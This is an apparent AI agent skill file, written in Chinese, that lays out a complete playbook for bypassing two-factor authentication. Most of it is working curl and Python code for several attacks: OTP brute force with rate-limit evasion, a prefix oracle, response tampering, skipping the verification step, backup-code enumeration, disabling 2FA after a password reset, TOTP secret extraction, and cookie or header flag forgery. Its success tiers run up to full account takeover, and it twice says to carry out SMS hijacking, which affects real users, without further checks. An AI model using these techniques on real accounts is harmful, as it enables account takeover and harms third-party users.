---
name: 秦鼎菱·二重印
description: >-
 2FA/MFA 完全绕过手法：OTP 暴力破解（无速率限制）、
 Response Manipulation（改 false→true）、
 跳过 2FA 步骤（直接访问下一页）、备份码泄露、
 SMS 劫持路径、TOTP 密钥泄露、Password Reset 绕过 2FA、
 OAuth 令牌绕过 2FA。
 账户接管链走 account-takeover-chain；密码重置走 auth-brute。
version: 1.0.0
---

> **秦鼎菱**
> 一点灵性金中藏，三十万载蕴神光。
> 今朝运来重见天，奉正殉道血玄黄。

# 2FA/MFA 绕过完整手法

**前提**：目标在 `授权范围`。SMS 劫持影响真实用户，授权内直接做。

---

## 分流决策树

```
遇到 2FA
 ├─ OTP 位数少（4-6 位）+ 无速率限制 → §1 暴力破解
 ├─ 错误前缀与正确前缀响应分流 → §1.5 前缀预言机（先于全量爆破）
 ├─ 返回 {"success":false} 类型响应 → §2 响应篡改
 ├─ 2FA 在独立步骤（step2.php / /verify 端点）→ §3 步骤跳过
 ├─ 有备份/恢复码功能 → §4 备份码
 ├─ 密码重置流程不需要 2FA → §5 密码重置绕过
 ├─ OAuth/SSO 登录不经过 2FA → §6 OAuth 绕过
 ├─ TOTP 密钥在 API/Cookie 中泄露 → §7 密钥提取
 └─ 基于 SMS → §8 SMS 路径
```

---

## §1 OTP 暴力破解

```bash
# 检测是否有速率限制
for code in 000000 111111 123456 999999; do
 r=$(curl -s -X POST "https://授权站/api/verify-otp" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d "{\"otp\":\"$code\"}")
 echo "$code → $(echo $r | cut -c1-80)"
done

# 完整 6 位枚举（无速率限制时）
python3 -c "
import requests, time

url = 'https://授权站/api/verify-otp'
headers = {'Content-Type': 'application/json', 'Authorization': 'Bearer TOKEN'}

for code in range(0, 1000000):
 otp = str(code).zfill(6)
 r = requests.post(url, json={'otp': otp, 'session': 'SESSION_ID'}, headers=headers, timeout=5)
 if '429' in str(r.status_code):
 print(f'[!] 速率限制 at {otp}')
 time.sleep(60)
 continue
 if 'success' in r.text.lower() and 'false' not in r.text.lower():
 print(f'[+] OTP FOUND: {otp}')
 break
 if code % 100 == 0:
 print(f'[-] Progress: {otp}')
"

# Turbo Intruder（Burp 插件，高速）
# 1. 捕获 OTP 请求
# 2. Extensions → Turbo Intruder
# 3. 设置 parallel=100，payload list 000000-999999
```

```bash
# 速率限制绕过技巧
# 1. 换 IP（代理池）
# 2. 换 Session/Token（每次重新登录）
# 3. null byte 注入：{"otp": "12345\u0000"}
# 4. 数组注入：{"otp": ["123456"]}
# 5. 整数类型：{"otp": 123456}（绕过字符串比较）
```

---

## §1.5 OTP 前缀预言机（先于全量爆破）

验证器若按前缀分段比较，会把 10^6 压成约 `10 × 位数` 次。

**全程锁死同一个预 MFA session**，中途重新登录会换 OTP，前缀进度作废。

```bash
# 对照：错误前缀 vs 正确前缀 的 status / 长度 / 文案是否分流
# 先扫 1 位：otp=0 … otp=9（必须在 body，不要放 query）
for d in 0 1 2 3 4 5 6 7 8 9; do
  echo -n "otp=$d → "
  curl -s -o /tmp/otp_r -w "%{http_code} %{size_download}" \
    -X POST "https://授权站/api/verify-otp" \
    -H "Content-Type: application/json" \
    -H "Cookie: session=$PRE_MFA_SESSION" \
    -d "{\"otp\":\"$d\"}"
  echo
  # 若某位 DIFF 明显（非统一 400），记下该位，后面拼 0-9 继续
done
```

有前缀 DIFF → 按位推进，不要直接跑 §1 全量 000000–999999。  
无 DIFF → 回 §1 看速率限制，或改走 §3 步骤跳过。SMS 劫持授权内直接做。

---

## §2 响应篡改（最简单）

```bash
# 原始响应：{"success":false,"message":"Invalid OTP"}
# 篡改为：{"success":true}

# Burp Suite：Proxy → Intercept → 修改响应体
# 或用 mitmproxy：
mitmproxy --mode transparent --modify-body '/api/verify-otp:false:true'

# 测试是否依赖响应：
# 1. 拦截正确 OTP 的成功响应，改为 success:false → 是否还能继续？
# 2. 拦截错误 OTP 的失败响应，改为 success:true → 是否直接跳转？

# 服务端 Session 绕过（关键）
# 有些服务端：只做客户端 redirect，实际未设置 server-side session
# 直接访问 2FA 后的页面看是否能访问
```

---

## §3 步骤跳过

```bash
# 登录流程：/login → /verify-2fa → /dashboard
# 测试直接访问 /dashboard（绕过 2FA 步骤）

curl -s "https://授权站/dashboard" \
 -H "Cookie: session=$SESSION_AFTER_PASSWORD" # 输完密码但还没完成 2FA 的 session

# 测试跳过 2FA 验证端点
curl -s "https://授权站/api/user/me" \
 -H "Authorization: Bearer $PRE_2FA_TOKEN" # 密码验证后拿到的 token

# 常见实现漏洞
# Laravel：middleware 检查 auth 但不检查 2fa_verified
# Express：JWT 包含 2fa_completed=false，但后端不验证该字段
# 测试用 JWT 解码修改 2fa_completed=true
python3 - << 'EOF'
import jwt, base64, json
token = "PRE_2FA_TOKEN"
# 解码（不验签）
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print("原始 payload:", payload)
# 如果有 2fa_completed/mfa_verified 字段，走 jwt-bypass-pentest
EOF
```

---

## §4 备份码攻击

```bash
# 获取备份码（如果 API 泄露）
curl -s "https://授权站/api/user/backup-codes" \
 -H "Authorization: Bearer $TOKEN"

# 备份码枚举（若格式可预测）
# 常见格式：8位数字、xxxx-xxxx、UUID
for code in $(seq -w 00000000 99999999 | head -10000); do
 curl -s -X POST "https://授权站/api/verify-backup-code" \
 -d "{\"code\":\"$code\"}" &
done

# 检查备份码是否在 JS 源码中硬编码
curl -s "https://授权站/js/app.js" | grep -oE '"backup[^"]*":[^,}]*'
```

---

## §5 密码重置绕过 2FA

```bash
# 重置密码后是否直接登录（跳过 2FA）？
# 1. 触发密码重置
curl -s -X POST "https://授权站/api/password/forgot" \
 -d '{"email":"victim@target.com"}'

# 2. 用控制的邮箱收重置链接，重置密码
# 3. 用新密码登录，看是否需要 2FA

# 常见漏洞：重置密码后的 magic link 直接登录不要求 2FA
curl -s "https://授权站/api/password/reset?token=RESET_TOKEN&password=NewPass1234!"

# 4. 检查账户接管后是否保留 2FA（ATO → disable 2FA）
curl -s -X DELETE "https://授权站/api/2fa" \
 -H "Authorization: Bearer $POST_RESET_TOKEN"
```

---

## §6 OAuth/SSO 绕过 2FA

```bash
# OAuth 登录通常不经过 2FA
# 如果目标支持 Google/GitHub OAuth，尝试用 OAuth 登录绕过 2FA

# 测试 OAuth 登录端点
curl -s "https://授权站/auth/google" -v
curl -s "https://授权站/auth/github" -v
curl -s "https://授权站/api/social-login" \
 -d '{"provider":"google","token":"GOOGLE_TOKEN"}'

# SAML SSO 绕过
# 如果有 SP-initiated SSO，IdP 侧通常不强制 2FA
```

---

## §7 TOTP 密钥提取

```bash
# TOTP 设置时 QR 码 URL 泄露 secret
# URL 格式：otpauth://totp/site:email?secret=BASE32SECRET&issuer=site

# 检查 API 是否直接返回 secret
curl -s "https://授权站/api/2fa/setup" \
 -H "Authorization: Bearer $TOKEN"
# 若返回：{"qr_url":"otpauth://totp/...secret=JBSWY3DPEHPK3PXP..."}
# → 提取 secret 后可生成任意 OTP

# Python TOTP 生成
python3 -c "
import pyotp, time
secret = 'JBSWY3DPEHPK3PXP' # Base32 密钥
totp = pyotp.TOTP(secret)
print('当前 OTP:', totp.now())
print('30秒后:', totp.at(time.time() + 30))
"
```

---

## §8 SMS OTP 路径分析

```bash
# 检测 SMS OTP 是否通过前端传递（极不安全）
# 某些实现：服务端将 OTP 返回到前端 JSON 中！
curl -s -X POST "https://授权站/api/send-sms" \
 -H "Content-Type: application/json" \
 -d '{"phone":"+86138xxxx"}'
# 若响应包含 code/otp 字段 = 严重漏洞

# SMS API 泄露（Twilio/SendBird/Nexmo）
# 检查 /js/app.js 中的 SMS API 密钥
curl -s "https://授权站/js/app.js" | grep -oE 'AC[0-9a-f]{32}|SK[0-9a-f]{32}'

# SIM 劫持确认（确认 2FA 绑定的手机号后，走社会工程学）
```

---

## §9 Cookie/Header 混淆

```bash
# 某些 2FA 实现用 cookie 标记是否已完成 2FA
# Cookie: verified=0 → 改为 verified=1
curl -s "https://授权站/dashboard" \
 -H "Cookie: session=$SESSION; 2fa_verified=1; mfa_complete=true"

# 或请求头
curl -s "https://授权站/api/admin" \
 -H "Authorization: Bearer $TOKEN" \
 -H "X-2FA-Verified: true" \
 -H "X-MFA-Skip: 1"
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 发现 2FA 弱点（无速率限制/响应可篡改/步骤可跳过） |
| L2 | 绕过 2FA 进入账户 |
| L3 | 接管完成（改密/改绑定邮箱） |

---

## 真源

- 手法：`传承/黑楼兰·硬撼.md`
- 工具：`python3 炼蛊房/auth_brute_probe.py --help`
